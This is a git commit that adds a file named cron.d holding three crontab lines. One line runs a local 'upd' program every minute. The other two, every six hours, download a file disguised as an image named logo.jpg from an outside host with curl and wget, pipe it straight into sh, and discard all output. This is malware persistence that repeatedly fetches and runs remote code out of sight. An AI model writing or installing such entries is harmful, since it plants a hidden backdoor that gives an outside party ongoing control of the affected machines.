df8d1f18962fc70c3917a026e0819c4d7612bdba
gosrs <39125307+gosrs@users.noreply.github.com>
2018-05-23 23:34:54 +0800

    Add files via upload

---
+++ lx/ss/cron.d
@@ -0,0 +1,3 @@
+* * * * * $dir/upd >/dev/null 2>&1
+1 */6 * * * curl -fsSL http://zz.8282.space/lx/logo.jpg|sh  >/dev/null 2>&1
+2 */6 * * * wget -q -O- http://zz.8282.space/lx/logo.jpg|sh >/dev/null 2>&1
